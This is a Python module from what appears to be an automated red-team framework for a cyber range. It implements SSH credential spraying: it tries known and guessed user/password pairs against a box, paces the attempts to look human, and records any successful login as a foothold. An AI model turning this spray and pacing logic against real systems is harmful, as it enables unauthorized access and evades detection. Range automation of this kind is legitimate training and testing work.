"""spray_access — try the credentials intel already knows, over SSH, until one lands.

The v1 mechanic (`badauto/tactics/cred_spray.py`), restated on the v2 contract:

* **candidates come from intel, never a hand-maintained table.** For each box
  `ctx.intel.candidate_pairs(ip)` gives the per-box ground truth first (the box
  password, the credlist accounts, nakon's machine account, and — where nakon
  planted a `pam_permit` stack — any password at all), and the generic
  user x password pool follows as v1's bounded guesses. v1's order is kept
  because it is the cheap half: the exact artifact pairs are tried before
  guessing, and the attempt cap bounds the rest.
* **SSH is the channel.** Every box on the range ships sshd, Windows included
  (Administrator authenticates through the same transport), so one credential
  probe is the whole mechanism — no hydra, no sshpass, no second exec idiom.
* **A login is not a mutation.** Nothing is planted on the box and nothing is
  changed: the outcome lives in world state (a credential plus a `user`
  foothold), so this effect records no artifact and has no undo recipe.
* **A cap hit is a failure, not a success.** v1 returned `ok=True` when the
  attempt cap ran out with no working pair, and the seed then recorded `access`
  for boxes it had never entered (both Windows boxes, caught live, with no
  foothold and no seeded persistence). Here that path returns `ok=False` and
  says so; `ok=True` means a credential answered on the wire.

Two anti-grind rules, both from v1's audited dead code: the gate's
`ensure_retries` counter is consulted **per login** (a login at the cap is a
dead end, skipped — not a safety breach, so it never halts the loop), and two
consecutive transport failures end the pass, so a box that is simply gone costs
two probes instead of the whole cap at one connect timeout each.
"""

import time

from ..errors import GuardrailError, PolicyError, TransportError
from .base import Effect, Result, register

# Bound for the guesses; the per-box ground truth is never capped away first.
DEFAULT_CAP = 40
DEFAULT_PROBE_TIMEOUT = 20
# v1 slept between attempts to look like a human rather than a hammer.
DEFAULT_DELAY_SEC = 0.4
# Consecutive unanswered probes before the pass gives up on the box.
UNREACHABLE_AFTER = 2

PROBE_LINUX = "id -un"
PROBE_WINDOWS = "whoami"


def probe_command(windows):
    return PROBE_WINDOWS if windows else PROBE_LINUX


def is_windows_box(ctx, ip):
    """Target OS, from intel's boxes first (the authoritative field)."""
    box = ctx.intel.box_by_ip(ip)
    if box is not None:
        return bool(box.get("windows"))
    return ctx.is_windows(ip)


def candidate_pairs(ctx, ip):
    """[(user, password)] for this box, in the order they are tried.

    Per-box facts first (intel's `candidate_pairs(ip)`), then the generic pool
    as guesses. Empty passwords are kept: a box with SSH password auth on and an
    account without a password is a real range state.
    """
    pairs = []
    for pair in (ctx.intel.candidate_pairs(ip) or []):
        try:
            user, password = pair
        except (TypeError, ValueError):
            continue                      # a malformed intel row is not a candidate
        if user:
            pairs.append((str(user), "" if password is None else str(password)))
    for user in (ctx.intel.candidate_users() or []):
        for password in (ctx.intel.candidate_passwords() or []):
            if user:
                pairs.append((str(user), "" if password is None else str(password)))
    return list(dict.fromkeys(pairs))


def auth_rejected(exc):
    """True when a transport error is the box refusing the credential.

    The v2 transport is ONE wrapper (paramiko's exception types are flattened
    into TransportError), so the message is the only signal left. Getting this
    wrong in either direction is expensive: treating a rejection as "unreachable"
    gives up on a box we could still log into, and treating an unreachable box as
    a rejection burns the whole attempt cap at one connect timeout each.
    """
    return "auth" in str(exc).lower()


def within_retry_cap(ctx, ip, user):
    """The gate's per-login anti-grind counter, used as a skip and not a halt.

    `ensure_retries` raises GuardrailError by contract, but it is a counter, not
    a safety gate (see `exec/gate.py`): a login that has already failed
    `max_retries_per_service` times is a dead end for THIS candidate, and the
    pass moves on. Swallowing it here is the point — letting it escape would
    stop the run on a box that answered "wrong password" one time too often.
    """
    try:
        ctx.gate.ensure_retries(ctx.world, ip, user)
    except GuardrailError:
        return False
    return True


def probe_login(ctx, ip, user, password, windows, *, key_path=None, timeout=None):
    """One SSH login attempt.

    Returns ``(status, who, why)`` with status in:

    * ``"ok"``       — the box let us in; `who` is the account it says we are.
    * ``"rejected"`` — the box answered no (auth refused, or the probe failed).
    * ``"transport"``— the box did not answer at all.
    """
    cmd = probe_command(windows)
    try:
        rc, out, err = ctx.ssh.ssh(ip, user, password, cmd,
                                   timeout=timeout or DEFAULT_PROBE_TIMEOUT,
                                   windows=windows, key_path=key_path)
    except TransportError as exc:
        why = str(exc)
        return ("rejected" if auth_rejected(exc) else "transport", "", why)
    if rc == 0 and (out or "").strip():
        return "ok", (out or "").strip().splitlines()[-1].strip(), ""
    return "rejected", "", ((err or out or "").strip()[:160] or f"rc={rc}")


def sweep(ctx, ip, candidates, windows, *, cap, timeout=None, delay=0.0):
    """One ordered pass over ``(user, password, key_path)`` candidates.

    Stops at the first login. Returns a dict the caller can render:
    ``found`` (a dict, or None), ``attempts``, ``skipped`` (logins at the retry
    cap), ``transport`` (unanswered probes), ``capped``, ``unreachable``,
    ``last_error``, ``cap``.
    """
    out = {"found": None, "attempts": 0, "skipped": 0, "transport": 0,
           "capped": False, "unreachable": False, "last_error": None, "cap": cap}
    for user, password, key_path in candidates:
        if out["attempts"] >= cap:
            out["capped"] = True
            break
        if not within_retry_cap(ctx, ip, user):
            out["skipped"] += 1
            continue
        if delay and out["attempts"]:
            time.sleep(delay)
        out["attempts"] += 1
        status, who, why = probe_login(ctx, ip, user, password, windows,
                                       key_path=key_path, timeout=timeout)
        if status == "ok":
            out["found"] = {"user": user, "password": password, "who": who,
                            "key_path": key_path}
            break
        ctx.world.count_cred_try(ip, user)     # the gate's counter, advanced
        out["last_error"] = why
        if status == "transport":
            out["transport"] += 1
            if out["transport"] >= UNREACHABLE_AFTER:
                out["unreachable"] = True
                break
    return out


def sweep_summary(label, ip, outcome):
    """One operator-readable line for why a pass found nothing."""
    why = f"{label} on {ip}"
    if outcome.get("attempts"):
        why += f" after {outcome['attempts']} attempt(s)"
    if outcome.get("capped"):
        why += f" — attempt cap ({outcome['cap']}) hit with no working credential"
    if outcome.get("skipped"):
        why += (f"; {outcome['skipped']} login(s) skipped at the retry cap "
                "(a dead end, not a crash)")
    if outcome.get("unreachable"):
        why += " — the box stopped answering SSH (nothing to decide for the rest)"
    if outcome.get("last_error"):
        why += f" — last error: {outcome['last_error']}"
    return why


def limits_of(ctx):
    """(cap, timeout, delay) from config, with the v1-derived defaults."""
    limits = ctx.cfg.get("limits") or {}
    return (int(limits.get("cred_spray_max", DEFAULT_CAP) or DEFAULT_CAP),
            int(limits.get("spray_probe_timeout", DEFAULT_PROBE_TIMEOUT)
                or DEFAULT_PROBE_TIMEOUT),
            float(limits.get("spray_delay_sec", DEFAULT_DELAY_SEC) or 0))


@register
class SprayAccess(Effect):
    id = "spray_access"
    name = "credential spray (SSH)"
    description = ("Try intel's candidate credentials over SSH on one box until one "
                   "authenticates; a success becomes a foothold. Use it on a box we "
                   "have no access to, with the pairs intel already knows (the box "
                   "password, credlist accounts, planted-vuln credentials) before "
                   "falling back to generic guesses. Bounded by cred_spray_max and "
                   "the per-login retry cap, and quiet: nothing is planted on the box.")
    params = {
        "ip": {"type": "str", "required": True, "desc": "target box"},
    }
    tags = frozenset({"access"})
    needs = {"foothold": False, "root": False, "c2": False, "os": "any"}

    def check(self, ctx, params):
        super().check(ctx, params)
        ip = params["ip"]
        if not candidate_pairs(ctx, ip):
            raise PolicyError(f"spray_access has no candidate credential for {ip} — "
                              "intel knows no account on this box")
        if ctx.world.failure_count(self.id, ip) >= 2:
            raise PolicyError(f"spray_access already failed twice on {ip} — the known "
                              "pairs are burned; work another target")

    def run(self, ctx, params):
        ip = params["ip"]
        windows = is_windows_box(ctx, ip)
        pairs = candidate_pairs(ctx, ip)
        cap, timeout, delay = limits_of(ctx)
        source = f"{self.id}:{getattr(ctx.intel, 'source_name', 'intel')}"

        outcome = sweep(ctx, ip,
                        [(user, password, None) for user, password in pairs],
                        windows, cap=cap, timeout=timeout, delay=delay)
        found = outcome["found"]
        if found is None:
            return Result(False, sweep_summary(f"no working credential in "
                                               f"{len(pairs)} candidate(s)", ip, outcome),
                          data={"attempts": outcome["attempts"],
                                "candidates": len(pairs)})

        user, password, who = found["user"], found["password"], found["who"]
        ctx.world.add_cred(user, password, source, ip)
        ctx.world.add_foothold(ip, user, password, "user", windows=windows)
        ctx.world.note(ip, f"access: credential spray landed {user} "
                           f"({source}) after {outcome['attempts']} attempt(s)")
        return Result(True,
                      f"credential spray landed {user} on {ip} ({source}, "
                      f"{outcome['attempts']} attempt(s), box calls it {who or user})",
                      data={"user": user, "password": password, "who": who,
                            "attempts": outcome["attempts"], "source": source})
